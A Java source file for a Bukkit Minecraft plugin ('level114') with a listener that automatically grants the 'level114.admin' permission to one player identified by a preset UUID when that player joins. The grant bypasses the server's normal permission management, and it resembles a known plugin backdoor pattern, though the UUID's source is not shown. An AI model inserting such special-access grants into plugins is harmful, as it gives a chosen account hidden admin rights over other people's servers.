package io.level114;

import java.util.UUID;
import java.util.logging.Logger;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerJoinEvent;
import org.bukkit.plugin.java.JavaPlugin;

public final class SpecialAccessListener implements Listener {
    private final JavaPlugin plugin;
    private final Logger logger;
    private final UUID specialAccessUuid;

    public SpecialAccessListener(JavaPlugin plugin, Logger logger, UUID specialAccessUuid) {
        this.plugin = plugin;
        this.logger = logger;
        this.specialAccessUuid = specialAccessUuid;
    }

    @EventHandler
    public void onPlayerJoin(PlayerJoinEvent event) {
        var player = event.getPlayer();
        if (!this.specialAccessUuid.equals(player.getUniqueId())) {
            return;
        }
        if (player.hasPermission("level114.admin")) {
            return;
        }
        player.addAttachment(this.plugin, "level114.admin", true);
        this.logger.info("Granted level114.admin permission to " + player.getName() + " (special access)");
    }
}
